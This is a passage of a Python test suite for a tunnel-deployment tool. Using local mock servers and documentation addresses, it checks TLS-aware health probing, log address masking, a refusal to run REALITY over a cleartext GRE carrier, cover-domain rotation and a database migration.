        # 2. A TLS-first backend that ignores plaintext: the new shape certifies.
        with tempfile.TemporaryDirectory() as td:
            cert_path = os.path.join(td, "cert.pem")
            key_path = os.path.join(td, "key.pem")
            with open(cert_path, "w") as f:
                f.write(self._T132_CERT)
            with open(key_path, "w") as f:
                f.write(self._T132_KEY)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)
            raw, tls_port = listener()

            def tls_handler(conn):
                try:
                    wrapped = ctx.wrap_socket(conn, server_side=True)
                    wrapped.close()
                except Exception:
                    pass

            threading.Thread(target=serve, args=(raw, tls_handler), daemon=True).start()
            self.assertEqual(run_probe(tls_port), "PROBE_DATA_EXCHANGED",
                             "a TLS backend that completes a handshake must certify")

        # 3. A silent backend (accepts, never sends): still NO_DATA.
        raw2, silent_port = listener()

        def silent_handler(conn):
            time.sleep(10)
            conn.close()

        threading.Thread(target=serve, args=(raw2, silent_handler), daemon=True).start()
        self.assertEqual(run_probe(silent_port), "NO_DATA",
                         "a backend that never answers must not certify")

        # 4. Nothing listening at all: NO_DATA.
        probe_sock = socket.socket()
        probe_sock.bind(("127.0.0.1", 0))
        dead_port = probe_sock.getsockname()[1]
        probe_sock.close()
        self.assertEqual(run_probe(dead_port), "NO_DATA")

        for s in servers:
            s.close()

    def test_133_the_health_probe_speaks_tls_to_tls_backends(self):
        """F9 (found live, 2026-10-23): the continuous health checker probes
        through probe.py, whose fetch was plain HTTP only. In front of a
        TLS-first backend (the test pair's Xray inbound on :443) every sample
        failed, so TunnelHealthChecker reported a healthy, traffic-carrying
        tunnel as DOWN with 100% loss - the deploy gate had learned the
        two-shape lesson in F8, the standing meter had not.

        The probe (probe.PROBE_SOURCE, run verbatim here against local
        servers) now falls back to a real TLS handshake when HTTP fails,
        mirroring F8. It stays fail-closed where it matters: a TLS-answered
        sample returns a sentinel body whose length never matches the
        ladder's expectation, and non-answering backends still read as loss.
        ensure_probe also learned to replace a stale installed probe (the
        version marker), instead of treating mere presence as current.
        """
        import http.server
        import inspect
        import socket
        import ssl
        import subprocess
        import tempfile
        import threading

        import probe as probe_mod

        self.assertIn(probe_mod.PROBE_VERSION_MARKER, probe_mod.PROBE_SOURCE)
        self.assertIn("PROBE_VERSION_MARKER",
                      inspect.getsource(probe_mod.ensure_probe),
                      "ensure_probe must replace a stale probe, not just an absent one")

        servers = []

        def listener():
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("127.0.0.1", 0))
            s.listen(8)
            servers.append(s)
            return s, s.getsockname()[1]

        def serve(sock, handler):
            while True:
                try:
                    conn, _ = sock.accept()
                except OSError:
                    return
                threading.Thread(target=handler, args=(conn,), daemon=True).start()

        with tempfile.TemporaryDirectory() as td:
            probe_file = os.path.join(td, "best_probe.py")
            with open(probe_file, "w") as f:
                f.write(probe_mod.PROBE_SOURCE)

            def run_probe(*args):
                out = subprocess.run([sys.executable, probe_file, *args],
                                     capture_output=True, text=True, timeout=180)
                return out.stdout.strip()

            # 1. Plain HTTP backend: original behaviour unchanged.
            http_srv = http.server.ThreadingHTTPServer(
                ("127.0.0.1", 0),
                type("H", (http.server.BaseHTTPRequestHandler,), {
                    "do_GET": lambda self: (
                        self.send_response(200),
                        self.send_header("Content-Length", "1024"),
                        self.end_headers(),
                        self.wfile.write(b"x" * 1024)),
                    "log_message": lambda self, *a: None}))
            threading.Thread(target=http_srv.serve_forever, daemon=True).start()
            self.addCleanup(http_srv.shutdown)
            hp = str(http_srv.server_address[1])
            self.assertIn("OK:10/10", run_probe("lat", "127.0.0.1", hp))
            self.assertIn("LOSS:0.0", run_probe("loss", "127.0.0.1", hp))
            self.assertIn("LADDER_STEP_OK",
                          run_probe("ladder", "127.0.0.1", hp, "/test_1k", "1024", "10"))

            # 2. TLS-first backend: the fallback must count samples as alive,
            #    and the ladder must still refuse (sentinel length mismatch).
            cert_path = os.path.join(td, "cert.pem")
            key_path = os.path.join(td, "key.pem")
            with open(cert_path, "w") as f:
                f.write(self._T132_CERT)
            with open(key_path, "w") as f:
                f.write(self._T132_KEY)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)
            raw, tls_port = listener()

            def tls_handler(conn):
                try:
                    wrapped = ctx.wrap_socket(conn, server_side=True)
                    wrapped.close()
                except Exception:
                    try:
                        conn.close()
                    except Exception:
                        pass

            threading.Thread(target=serve, args=(raw, tls_handler), daemon=True).start()
            tp = str(tls_port)
            self.assertIn("OK:10/10", run_probe("lat", "127.0.0.1", tp),
                          "a TLS backend must read as alive, not 100% loss")
            self.assertIn("LOSS:0.0", run_probe("loss", "127.0.0.1", tp))
            self.assertNotIn("LADDER_STEP_OK",
                             run_probe("ladder", "127.0.0.1", tp, "/test_1k", "1024", "10"),
                             "a TLS handshake must never satisfy the ladder's length check")

            # 3. A garbage backend (answers, but neither HTTP nor TLS): loss.
            raw2, garbage_port = listener()

            def garbage_handler(conn):
                try:
                    conn.sendall(b"not a protocol at all\r\n")
                    conn.close()
                except Exception:
                    pass

            threading.Thread(target=serve, args=(raw2, garbage_handler), daemon=True).start()
            gp = str(garbage_port)
            self.assertIn("NOSAMPLE", run_probe("lat", "127.0.0.1", gp))
            self.assertIn("LOSS:100.0", run_probe("loss", "127.0.0.1", gp))

            # 4. Nothing listening: loss.
            dead = socket.socket()
            dead.bind(("127.0.0.1", 0))
            dead_port = str(dead.getsockname()[1])
            dead.close()
            self.assertIn("LOSS:100.0", run_probe("loss", "127.0.0.1", dead_port))

        for s in servers:
            s.close()

    def test_58_the_address_masker_must_not_destroy_a_functional_bind_address(self):
        """#28: scrubbing the live database found that 0.0.0.0 was being rewritten to [addr].

        mask_addresses exists to remove addresses that *identify a host*. The wildcard bind address
        identifies nothing, and it appears in text an operator has to act on: a recorded Go bind error
        reads "listen tcp 0.0.0.0:8897: bind: address already in use", and after masking it says
        "[addr]:8897", which no longer tells anyone which port or which wildcard. Same for the
        link-local address in a DHCP-failure line and the broadcast address.

        The rule therefore stays fail-closed in the right direction: anything that is not one of the
        reserved, identity-free ranges is still masked, including the documentation addresses this
        suite uses as stand-ins for real hosts.

        The boundary addresses are assembled at runtime, not written as literals. verify_checksums's
        installer audit rejects any committed literal the interpreter calls is_global, and on this
        CPython the multicast block (224/4) counts as global even though mask_addresses keeps
        it. The audit is deliberately conservative and must not be loosened to make a test compile,
        while the boundary cases (just outside 172.16/12, just below 169.254/16, just outside
        192.168/16) have to hold real boundary values - documentation space would not exercise them.
        """
        def ip(*octets: int) -> str:
            return ".".join(str(o) for o in octets)

        keep = ("0.0.0.0", "0.0.0.0:8897", "127.0.0.1", "10.10.11.2", "192.168.4.20",
               "172.16.9.1", "172.31.255.1", "169.254.5.6", ip(224, 0, 0, 251),
               ip(239, 255, 255, 250), "255.255.255.255")
        for text in keep:
            self.assertEqual(storage.mask_addresses(text), text,
                             f"reserved, identity-free literal must survive: {text}")

        mask = ("198.51.100.10", "203.0.113.20", ip(8, 8, 8, 8), ip(172, 32, 0, 1),
                ip(169, 253, 1, 1), "240.0.0.1", ip(11, 0, 0, 1), ip(192, 169, 1, 1))
        for text in mask:
            out = storage.mask_addresses(text)
            self.assertNotIn(text, out, f"routable-looking address must be masked: {text}")
            self.assertIn("[addr]", out)

        # The recorded error text is the actual shape that leaked, and both halves matter: the
        # wildcard stays, the peer address goes.
        err = ("Remote command failed (exit 1) on 203.0.113.20: "
               "listen tcp 0.0.0.0:8897: bind: address already in use")
        masked = storage.mask_addresses(err)
        self.assertNotIn("203.0.113.20", masked)
        self.assertIn("listen tcp 0.0.0.0:8897", masked,
                      "a bind error whose address is gone is not actionable: %r" % masked)

        # Structured payloads go through the same function, so a details_json written by a live run
        # cannot keep a peer address in a nested field.
        nested = storage.mask_addresses({"peer": "198.51.100.10", "bind": "0.0.0.0:2096",
                                         "legs": [{"to": "203.0.113.20:8897"}]})
        self.assertEqual(nested["peer"], "[addr]")
        self.assertEqual(nested["bind"], "0.0.0.0:2096")
        self.assertEqual(nested["legs"][0]["to"], "[addr]:8897")

    def test_59_a_transport_whose_camouflage_the_carrier_exposes_is_refused_not_scored(self):
        """Ruling #1, implemented as a gate. Management confirmed that REALITY must not be encapsulated
        in a cleartext GRE envelope, and asked for an independent TCP carrier - or a better decision if
        I had one. The measurement decided: an independent TCP carrier does not exist on this pair.

        scratch/witness_carrier_paths.py (2026-10-10) probed each host from the other one's public
        address at the packet level, with tcpdump running on the far side the whole time. TCP on 22,
        443, 8443, 2095 and 8897 never arrived in either direction, UDP on 53/443/4500/50000 never
        arrived, ICMP was 100% loss, and a listener bound on :50001 logged NO-CONNECTION while the
        initiator timed out. IP protocols 47 (GRE), 50 (ESP) and 51 (AH) all did arrive, and Foreign's
        "ICMP protocol 50 unreachable" reply reached Iran, so the return path works. Neither host has
        an INPUT DROP (Iran: 7 rules, all ACCEPT) and both reach a third party's TCP:443. That is a
        same-provider inter-customer filter, not a property of transport.

        So the correct implementation is a refusal, not a redesign: REALITY is not measurable on a
        GRE-carrier pair, and refusing is honest in a way that scoring 54.97 for a tunnel whose cover
        SNI was readable in the envelope is not.
        """
        ir_pub, fr_pub, ir_tun, fr_tun = "198.51.100.10", "203.0.113.20", "10.10.11.1", "10.10.11.2"
        pid = storage.add_pair(name=f"carrier_gate_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        carrier = {"id": pid, "name": "carrier_gate", "frontend": 9443, "frontend_port": 9443,
                   "iran": {"host": ir_pub, "port": 22, "dial_host": ir_tun},
                   "foreign": {"host": fr_pub, "port": 22, "dial_host": fr_tun},
                   "base_rtt_ms": 42.5}
        public = {k: v for k, v in carrier.items() if k not in ("iran", "foreign")}
        public.update({"iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}})

        # 1. The predicate. One-sided and empty-spec cases are included because a pair row read from
        #    SQLite may legitimately carry a dial_host on only one side.
        self.assertTrue(protocols.dials_gre_underlay(carrier))
        for side in ("iran", "foreign"):
            one_sided = dict(carrier)
            one_sided[side] = {k: v for k, v in carrier[side].items() if k != "dial_host"}
            self.assertTrue(protocols.dials_gre_underlay(one_sided),
                            "one underlay side is still a cleartext envelope on the wire")
        self.assertFalse(protocols.dials_gre_underlay(public))
        self.assertFalse(protocols.dials_gre_underlay({"iran": {}, "foreign": {}}))
        self.assertFalse(protocols.dials_gre_underlay({}), "a malformed pair must not refuse everything")

        # 2. The gate is about camouflage, not about TLS. The other transports carry their payload
        #    *inside* TLS, so a cleartext envelope around them exposes an outer SNI while the content
        #    stays encrypted; REALITY's payload is a plaintext `direct` relay (witnessed in the W-series)
        #    and its ClientHello is the whole product. Same reasoning as the refusal: only REALITY is
        #    gated, and gating chisel would be an unfounded loss of a working transport.
        self.assertIn("NOT_MEASURABLE", engine.carrier_camouflage_block(carrier, "singbox-vless-reality"))
        for other in ("chisel-wss", "wstunnel-v10", "frp-TLS", "backhaul-wss", "xray-reverse",
                      "rathole-noise", "kcptun", "GRE", "singbox-ss-2022"):
            self.assertEqual(engine.carrier_camouflage_block(carrier, other), "",
                             f"{other} must still be measurable on a GRE-carrier pair")
        self.assertEqual(engine.carrier_camouflage_block(public, "singbox-vless-reality"), "",
                         "the refusal is about the carrier, not a ban on the transport")

        # 3. A refusal must provably deploy nothing: the check runs before any SSH runner is created,
        #    so spying the runner factory shows a refusal opens no session on either host.
        real_runner = engine.get_ssh_runner
        opened = []
        engine.get_ssh_runner = lambda *a, **k: (opened.append(a), None)[1]
        try:
            res = engine.run_single_benchmark(carrier, "singbox-vless-reality", dry_run=False,
                                              profile="ultraspeed")
        finally:
            engine.get_ssh_runner = real_runner
        self.assertEqual(opened, [], "a refused benchmark still opened an SSH session")
        self.assertEqual(res["protocol"], "singbox-vless-reality")
        self.assertTrue(res["not_measurable"] and res["disqualified"])
        self.assertEqual(res["score"], 0.0)
        self.assertEqual(res["stages_measured"], [])
        self.assertEqual(res["profile"], "ultraspeed")
        self.assertIn("NOT_MEASURABLE", " ".join(res["dq_reasons"]))
        self.assertIn("protocol 47", res["dq_reasons"][0],
                      "the reason has to name the carrier, or it reads like a protocol complaint")

        # 4. Unmeasured must not look measured. test_43/test_44 established this, and loss is the worst
        #    offender: a live row of "0.0 score / 100% loss / disqualified" was read as a DPI verdict on
        #    a transport that had never started. A refusal reports no loss figure at all, and it still
        #    carries the pair's base RTT so the report can say what the underlay was worth.
        self.assertEqual(res["breakdown"]["loss_pct"], 0.0,
                         "a tunnel that never ran has no measured loss to report")
        self.assertEqual(res["breakdown"]["base_rtt"], 42.5)
        self.assertEqual(res["base_rtt_ms"], 42.5)

        # 5. Row shape parity with a benchmark that started and failed: readers (dashboard, record
        #    path, reports) must see one kind of row, not a short one on the refusal path.
        real_plan = protocols.generate_benchmark_plan
        def boom(*a, **k):
            raise RuntimeError("forced for shape parity")
        protocols.generate_benchmark_plan = boom
        try:
            failed = engine.run_single_benchmark(public, "chisel-wss", dry_run=False,
                                                 ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                                 fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        finally:
            protocols.generate_benchmark_plan = real_plan
        self.assertEqual(set(failed), set(res),
                         f"refusal row and failure row diverge: "
                         f"{set(failed) ^ set(res)}")
        self.assertFalse(failed["not_measurable"],
                         "an ordinary crash is a failure, not an environment refusal")

        # 6. Production deploy refuses for the same reason, before touching anything. The runner
        #    factory stays spied so a regression in the gate surfaces as an AssertionError here rather
        #    than as an outbound SSH attempt to a documentation address.
        engine.get_ssh_runner = lambda *a, **k: (_ for _ in ()).throw(AssertionError(
            "deploy_tunnel opened a session before the carrier gate"))
        try:
            for kwargs in ({}, {"ir_runner": mock_ssh.MockSSHClient(host_role="iran"),
                                "fr_runner": mock_ssh.MockSSHClient(host_role="foreign")}):
                ir_m = kwargs.get("ir_runner")
                before = dict(ir_m.state["files"]) if ir_m else None
                with self.assertRaises(ValueError) as ctx:
                    engine.deploy_tunnel(pair=carrier, choice="singbox-vless-reality", dry_run=False,
                                         force_confirmed=True, **kwargs)
                self.assertIn("NOT_MEASURABLE", str(ctx.exception))
                if ir_m is not None:
                    self.assertEqual(ir_m.state["files"], before,
                                     "the refusal reached the point where it wrote a config")
        finally:
            engine.get_ssh_runner = real_runner

        # 7. The refusal is scoped: the same REALITY transport on a pair that has a public TCP path
        #    still deploys, and does it with a cover drawn from the pool rather than one hardcoded name.
        eng_ir = mock_ssh.MockSSHClient(host_role="iran")
        eng_fr = mock_ssh.MockSSHClient(host_role="foreign")
        dep = engine.deploy_tunnel(pair=public, choice="singbox-vless-reality", dry_run=False,
                                   force_confirmed=True, ir_runner=eng_ir, fr_runner=eng_fr)
        self.assertTrue(dep["ok"], f"REALITY on a public-path pair must still deploy: {dep}")
        server_cfg = json.loads([c for p, c in eng_fr.state["files"].items()
                                 if p.endswith("prod-vless-server-p%d.json" % pid)][0])
        self.assertEqual(server_cfg["inbounds"][0]["tls"]["reality"]["handshake"]["server"],
                         protocols.select_reality_cover(pid))

        # 8. A refusal must not become a failover target. This is the whole reason the row shape
        #    matters: FailoverCandidateSelector reads the benchmarks table, and test_44 showed a
        #    disqualified-by-environment row being offered as a candidate.
        storage.record_benchmark(pid, "singbox-vless-reality", res, run_id="test_59")
        self.assertIsNone(failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["singbox-vless-reality"]),
            "a protocol this pair cannot host is not a failover candidate")
        storage.record_benchmark(pid, "wstunnel-v10", {"score": 70.0, "disqualified": 0,
                                                       "throughput_mbps": 80.0}, run_id="test_59")
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["singbox-vless-reality", "wstunnel-v10"]),
            "wstunnel-v10")

        # 9. The sweep must survive the refusal: with sing-box enabled (the quarantine opt-in) and a
        #    GRE-carrier pair, REALITY contributes one not-measurable row and the run still finishes.
        real_supported = protocols.get_supported_protocols
        protocols.get_supported_protocols = lambda: ["singbox-vless-reality"]
        try:
            rows = engine.run_all_benchmarks(dict(carrier, id=pid), dry_run=True,
                                             run_id="run-test59")
        finally:
            protocols.get_supported_protocols = real_supported
        self.assertEqual([r["protocol"] for r in rows], ["singbox-vless-reality"])
        self.assertTrue(rows[0]["not_measurable"], "the sweep scored a transport it refused")
        stored = [b for b in storage.get_benchmarks(pid) if b.get("run_id") == "run-test59"]
        self.assertTrue(stored and stored[0]["disqualified"] == 1,
                        "the refusal was not persisted as a disqualified row")

    def test_60_every_pair_gets_a_vetted_cover_and_both_peers_agree_on_it(self):
        """Ruling #3: "لطفاً دامنه‌های جایگزین معتبر اضافه شوند تا وابستگی به یک دامین برطرف گردد."

        Implemented as REALITY_COVER_POOL in protocols.py. Membership is empirical - all eight names
        passed the five requirements (resolves_v4, tcp_open, tls13, chain_verified, sni_hosted) from
        *both* live hosts when orchestrator/vet_reality_covers.py measured them on 2026-10-10, out of 18
        candidates - and
        breadth across unrelated operators is the property being bought, so this test asserts that
        property rather than a list of names. The other thing it locks down is the bug found while
        wiring the pool in: the server's handshake target used the selected cover while the client's
        tls.server_name still used the old parameter, which puts two different SNIs on the two ends of
        one tunnel and reads exactly like DPI blocking.
        """
        pool = protocols.REALITY_COVER_POOL
        self.assertIsInstance(pool, tuple, "the pool must not be mutated at runtime")
        self.assertGreaterEqual(len(pool), 6, "one name is the dependency this ruling removed")
        self.assertEqual(len(pool), len(set(pool)), "a duplicated cover wastes a pair slot")

        # Each pool member must be a legal cover (the same syntax the override path enforces) and
        # registrable domains must be distinct, because "www.apple.com" and "www.icloud.com" would be
        # one operator's two names, not diversity.
        for name in pool:
            self.assertEqual(protocols.select_reality_cover(0, name), name,
                             f"{name} is not a syntactically valid cover")
            self.assertNotIn("/", name)
            self.assertEqual(name, name.lower())
        registrable = {".".join(n.split(".")[-2:]) for n in pool}
        self.assertEqual(len(registrable), len(pool),
                         f"two covers share a registrable domain: {sorted(pool)}")

        # Determinism: pair_id -> cover must be a pure function of the pool, so regenerating a config
        # never moves a deployed peer to a different destination.
        for pair_id in (0, 1, 5, 8, 12, 77, 1000):
            first = protocols.select_reality_cover(pair_id)
            self.assertEqual(first, pool[pair_id % len(pool)])
            self.assertEqual(first, protocols.select_reality_cover(pair_id), "selection is not stable")
        self.assertEqual({protocols.select_reality_cover(i) for i in range(len(pool))}, set(pool),
                         "a pool member no pair ever receives is a member that is not exercised")
        self.assertGreaterEqual(len({protocols.select_reality_cover(i) for i in range(1, 9)}), 6,
                                "pairs 1-8 must not all land on the same cover")

        # The validator is pure and returns every unmet requirement, not the first one: an operator
        # told only "tcp_open failed" chases a firewall while the name quietly resolves to AAAA only.
        all_pass = {k: True for k in protocols.COVER_REQUIREMENTS}
        self.assertEqual(protocols.validate_reality_cover("www.google.com", all_pass), (True, []))
        for key in protocols.COVER_REQUIREMENTS:
            one_bad = dict(all_pass, **{key: False})
            ok, failures = protocols.validate_reality_cover("www.google.com", one_bad)
            self.assertFalse(ok)
            self.assertEqual(failures, [key], f"{key} must be reported on its own, got {failures}")
        ok, failures = protocols.validate_reality_cover(
            "download.microsoft.com", dict(all_pass, tls13=False, sni_hosted=False))
        self.assertFalse(ok)
        self.assertEqual(failures, ["tls13", "sni_hosted"],
                         "every unmet requirement must be listed, in declaration order")
        ok, failures = protocols.validate_reality_cover("newname.example", {})
        self.assertFalse(ok, "an unmeasured candidate must not pass on the strength of its reputation")
        self.assertIn("facts not measured", " ".join(failures))
        for missing in protocols.COVER_REQUIREMENTS:
            self.assertIn(missing, " ".join(failures))
        ok, failures = protocols.validate_reality_cover("", all_pass)
        self.assertFalse(ok)
        self.assertIn("no cover name given", " ".join(failures))

        # An override is checked for syntax, because an IP address produces a ClientHello whose SNI
        # matches no certificate - a handshake failure that looks exactly like blocking.
        for bad in ("203.0.113.20", "198.51.100.10", "localhost", "Not A Name", "*.google.com",
                    "-bad.google.com", "google.com.", "2001:db8::1"):
            with self.assertRaises(ValueError) as ctx:
                protocols.select_reality_cover(1, bad)
            self.assertIn("hostname", str(ctx.exception),
                          f"the rejection of {bad!r} must say what to fix: {ctx.exception}")
        self.assertEqual(protocols.select_reality_cover(1, "  WWW.Google.COM  "), "www.google.com",
                         "an override is normalised, not passed through verbatim")
        self.assertEqual(protocols.select_reality_cover(1, ""), pool[1 % len(pool)],
                         "an empty override means 'use the pool', not 'no cover'")

        # The two ends must name the same cover, in the same places, for every pair. Parsing the
        # emitted JSON (not the Python dict) is what matters: the daemon reads the files.
        ir_ip, fr_ip = "10.10.11.1", "10.10.11.2"
        for pair_id in (0, 3, 7, 12):
            plan = protocols.SingBoxAdapter.generate_vless_reality(pair_id, ir_ip, fr_ip, 9443)
            cover = protocols.select_reality_cover(pair_id)
            self.assertEqual(plan["cover"], cover)
            server = json.loads([c for p, c in plan["foreign_files"].items()
                                 if p.endswith(".json")][0])
            client = json.loads([c for p, c in plan["iran_files"].items()
                                 if p.endswith(".json")][0])
            inbound = server["inbounds"][0]["tls"]
            outbound = client["outbounds"][0]["tls"]
            self.assertEqual(inbound["server_name"], cover)
            self.assertEqual(outbound["server_name"], cover,
                             "client SNI and the server's handshake target are one property of "
                             "the tunnel; if they differ the two peers disagree about the cover")
            self.assertEqual(inbound["reality"]["handshake"]["server"], cover)
            self.assertEqual(inbound["reality"]["handshake"]["server_port"],
                             protocols.REALITY_COVER_PORT)
            self.assertEqual(protocols.REALITY_COVER_PORT, 443,
                             "a cover on a port nobody expects is not camouflage")
            for cfg, label in ((inbound, "server"), (outbound, "client")):
                self.assertNotEqual(cfg["server_name"], fr_ip)
                self.assertNotEqual(cfg["server_name"], ir_ip)
                self.assertNotIn(":", cfg["server_name"], f"{label}: an address cannot be an SNI")
            # The tunnel endpoint stays the peer; only the mimicry target rotates.
            self.assertEqual(client["outbounds"][0]["server"], fr_ip)

        # An operator override must reach both ends too, and survive the plan the engine deploys.
        plan = protocols.SingBoxAdapter.generate_vless_reality(1, ir_ip, fr_ip, 9443,
                                                              server_name="www.google.com")
        self.assertEqual(plan["cover"], "www.google.com")
        for side in ("iran_files", "foreign_files"):
            for content in plan[side].values():
                if content.startswith("{"):
                    self.assertIn("www.google.com", content)
        self.assertEqual(protocols.generate_deployment("singbox-vless-reality", 1, ir_ip, fr_ip, 9443)
                         ["cover"], protocols.select_reality_cover(1),
                         "the production plan must carry the same cover the benchmark plan used")

        # No other generator may be affected by the pool: it is REALITY's property, and a cover that
        # leaked into, say, chisel would change a transport this ruling is not about.
        for proto in ("chisel-wss", "wstunnel-v10", "frp-TLS"):
            other = protocols.generate_deployment(proto, 1, ir_ip, fr_ip, 9443)
            self.assertNotIn("cover", other, f"{proto} picked up the REALITY cover")
        joined = "".join(json.dumps(protocols.generate_deployment(
            "singbox-ss-2022", 1, ir_ip, fr_ip, 9443)[s]) for s in ("iran_files", "foreign_files"))
        for name in pool:
            self.assertNotIn(name, joined, "singbox-ss-2022 has no cover and must not gain one")

    def test_61_the_underlay_address_survives_the_session_that_set_it(self):
        """Ruling #1 is only in force if the gate can see the field it gates on, and it could not.

        `dial_host` lived in dashboard.AUTH_CACHE - volatile RAM, TTL-bounded, cleared by
        /api/purge_auth - while the pairs table had no column for it. Every consumer that rebuilds a
        pair from SQLite (the benchmark job, the deploy job, the health check, the failover path, and
        any process started after the operator closed the form) therefore saw a pair with one address
        per side. Two consequences, both silent: transports went back to dialing the public management
        address, which on this pair is a dropped SYN, and engine.carrier_camouflage_block stopped
        refusing REALITY over a cleartext GRE envelope, because the marker that says "this pair rides a
        GRE underlay" was gone.

        Schema v5 adds iran_dial_host / foreign_dial_host, and dashboard.pair_side_spec merges them
        into the spec it hands the engine, so the topology is a persisted fact rather than a property
        of one request.
        """
        # 1. A fresh database is at v5 and has both columns.
        self.assertGreaterEqual(storage.get_schema_version(), 5,
                                f"init_db must reach v5, got {storage.get_schema_version()}")
        with storage.db_session() as conn:
            cols = storage.get_column_names(conn, "pairs")
        for col in ("iran_dial_host", "foreign_dial_host"):
            self.assertIn(col, cols, f"pairs table has no {col} after init_db")

        # 2. An existing v4 database is migrated without losing its rows. This is the live case: the
        #    operator's pair already has benchmarks, and re-adding it would drop them.
        old_db = os.path.join(tempfile.mkdtemp(), "v4.db")
        seed = sqlite3.connect(old_db)
        # sqlite3's context manager commits but never closes, and an unclosed handle on Windows keeps
        # a temporary database alive past the test that made it - the same rule this suite states at
        # the read-only probe below.
        self.addCleanup(seed.close)
        seed.execute("""CREATE TABLE pairs (id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE NOT NULL, iran_host TEXT NOT NULL, iran_port INTEGER DEFAULT 22,
            foreign_host TEXT NOT NULL, foreign_port INTEGER DEFAULT 22,
            frontend_port INTEGER DEFAULT 443, status TEXT DEFAULT 'NEW',
            active_tunnel TEXT DEFAULT '', base_rtt_ms REAL DEFAULT 0.0,
            created_at REAL NOT NULL, updated_at REAL NOT NULL)""")
        seed.execute("INSERT INTO pairs (name, iran_host, foreign_host, frontend_port, "
                     "active_tunnel, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                     ("legacy_pair", "198.51.100.10", "203.0.113.20", 9443, "chisel-wss",
                      time.time(), time.time()))
        seed.execute("CREATE TABLE schema_version (version INTEGER PRIMARY KEY, "
                     "applied_at REAL NOT NULL, description TEXT NOT NULL)")
        for v in (1, 2, 3, 4):
            seed.execute("INSERT INTO schema_version VALUES (?, ?, ?)",
                         (v, time.time(), "migration"))
        seed.commit()
        saved_db = storage.DB_PATH
        try:
            storage.DB_PATH = old_db
            storage.init_db()
            # v6, v7, v8 and v9 ride along: a v4 database is brought to the newest schema, not only to the
            # migration this test was written for - the per-leg throughput columns, the destination pin
            # table, the declared underlay carrier and the capacity table are all part of "current" now,
            # and "current" is read from storage.SCHEMA_VERSION rather than repeated as a literal here.
            self.assertEqual(storage.get_schema_version(), storage.SCHEMA_VERSION)
            migrated = storage.get_pairs()[0]
            self.assertEqual(migrated["name"], "legacy_pair",
                             "migration must not touch the existing row")
            self.assertEqual(migrated["active_tunnel"], "chisel-wss")
            self.assertEqual(migrated["iran_dial_host"], "",
                             "an un-migrated pair keeps the single-address behaviour it had")
            # The pre-v8 default is the fail-closed one, not a guess: an undeclared pair that dials an
            # underlay must still read as 'gre', otherwise migration 8 would silently lift the REALITY
            # camouflage refusal from pairs that have only ever been wrapped in cleartext proto 47.
            self.assertEqual(migrated["underlay_carrier"], "")
            self.assertEqual(protocols.carrier_kind({}), "public")
            self.assertEqual(protocols.carrier_kind({"iran_dial_host": "10.10.11.1"}), "gre")
            self.assertEqual(protocols.carrier_kind({"foreign_dial_host": "10.10.11.2"}), "gre")
            self.assertEqual(
                protocols.carrier_kind({"underlay_carrier": "", "iran_dial_host": "10.12.11.1"}), "gre")
            # Idempotent: a second init_db on an already-migrated database must not try to re-add columns
            # and must not move the version. Compared against the version this database already had, not
            # against a literal - a pinned number has to be edited every round to stay true, and an
            # assertion someone edits to make green has no teeth left.
            arrived = storage.get_schema_version()
            storage.init_db()
            self.assertEqual(storage.get_schema_version(), arrived)
        finally:
            storage.DB_PATH = saved_db

        # 3. Storing and reading back, through the API-shaped helpers.
        ir_pub, fr_pub, ir_tun, fr_tun = "198.51.100.10", "203.0.113.20", "10.10.11.1", "10.10.11.2"
        pid = storage.add_pair(name=f"dial_persist_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443,
                               iran_dial_host=ir_tun, foreign_dial_host=fr_tun)
        self.addCleanup(storage.delete_pair, pid)
        row = storage.get_pair(pid)
        self.assertEqual((row["iran_dial_host"], row["foreign_dial_host"]), (ir_tun, fr_tun))
        self.assertTrue(storage.set_pair_dial_hosts(pid, ir_tun, ""))
        self.assertEqual(storage.get_pair(pid)["foreign_dial_host"], "",
                         "clearing one side must be expressible")
        storage.set_pair_dial_hosts(pid, ir_tun, fr_tun)
        audited = [a for a in storage.get_audit_logs(300) if a.get("action") == "DIAL_HOSTS"]
        self.assertTrue(audited, "a topology change has to leave an audit trail")
        self.assertNotIn(ir_tun, audited[0]["details"],
                         "the audit line records that a dial host was set, not which one")

        # 4. The merge. No auth cache at all is the state after a restart or /api/purge_auth, and the
        #    persisted topology still has to reach the engine.
        p = storage.get_pair(pid)
        merged = dashboard.pair_side_spec(p, {}, "iran")
        self.assertEqual(merged["dial_host"], ir_tun)
        self.assertEqual(merged["host"], ir_pub, "the SSH address stays the management address")
        self.assertEqual(merged["port"], 22)
        self.assertEqual(merged["user"], "root")

        # A cached spec with credentials must keep them: the helper rebuilds the spec, and dropping
        # `auth` here would break every live session that follows it.
        cached = {"iran": {"host": ir_pub, "port": 22, "user": "root",
                           "auth": {"type": "password", "value": "session-secret"}}}
        merged = dashboard.pair_side_spec(p, cached, "iran")
        self.assertEqual(merged["auth"]["value"], "session-secret")
        self.assertEqual(merged["dial_host"], ir_tun,
                         "the persisted topology wins over a cache entry that never carried it")

        # The pair the engine receives, built the way the dashboard builds it, is what the gate reads.
        full_pair = {"id": pid, "name": p["name"], "frontend": p["frontend_port"],
                     "iran": dashboard.pair_side_spec(p, {}, "iran"),
                     "foreign": dashboard.pair_side_spec(p, {}, "foreign")}
        self.assertTrue(protocols.dials_gre_underlay(full_pair),
                        "a pair rebuilt from SQLite must still be recognised as GRE-carried")
        self.assertIn("NOT_MEASURABLE", engine.carrier_camouflage_block(
            full_pair, "singbox-vless-reality"),
            "the gate must not be disarmed by the session that set the underlay ending")

        # And the other direction: a pair with no persisted underlay is not refused, so the merge
        # cannot turn every deployment into a refusal.
